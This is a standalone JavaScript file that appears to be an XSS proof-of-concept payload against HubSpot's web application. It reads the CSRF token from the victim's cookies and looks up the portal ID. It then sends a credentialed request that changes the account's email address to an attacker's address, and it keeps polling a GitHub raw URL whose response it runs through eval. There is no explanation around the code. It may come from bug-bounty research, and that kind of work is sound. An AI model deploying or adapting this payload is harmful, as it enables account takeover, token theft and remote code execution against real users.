//alert(origin)
console.log(document.cookie)
console.log(origin)
//window.top.location.href="/xxxxxxxxxxxx"


attacker_email = "lchua+customerportal@hubspot.com"
cookies=document.cookie
x = cookies.indexOf("csrf.app=")+9
y = cookies.substring(x).indexOf(";")
csrf_token=""
if (y == -1)
{
	csrf_token = cookies.substring(x)
}
else
	csrf_token = cookies.substring(x,y+x)


var req = new XMLHttpRequest();
req.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
		pid=JSON.parse(req.responseText)["portalId"]
		console.log(pid)
		data = {"id":pid,"accountName":"hacked-"+Date.now()}
		console.log(data)

		//reqx = new XMLHttpRequest()
		//reqx.open("PUT","https://app-eu1.hubspot.com/api/hubs/v1/hubs?portalId="+pid,true)
		//reqx.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrf_token)
		//reqx.withCredentials = true
		//reqx.send(JSON.stringify(data));
		reqx = new XMLHttpRequest()
		change_mail_url = "https://app-eu1.hubspot.com/api/userpreferences/v1/emailAddresses/edit/"+attacker_email+"?portalId="+pid+"&clienttimeout=14000&hs_static_app=settings-ui-security&hs_static_app_version=1.5647"
		reqx.open("POST",change_mail_url,true)
		reqx.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrf_token)
		reqx.withCredentials = true
		reqx.send()

	}
};

req.open("GET", "https://api-eu1.hubspot.com/home/v2/api/portal", true);
req.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrf_token)
req.withCredentials = true
req.send();


change_email = setInterval(function(){
	reqy = new XMLHttpRequest()	
	reqy.onreadystatechange = function() {
		if (this.readyState == 4 && this.status == 200) {
			if (reqy.responseText.length >5 )
			{
				eval(reqy.responseText)
				clearInterval(change_email)
			}
		}
	}
	reqy.open("GET","https://raw.githubusercontent.com/jayteezer/Playground/main/cflink.php",true)
	reqy.send()
},1000)
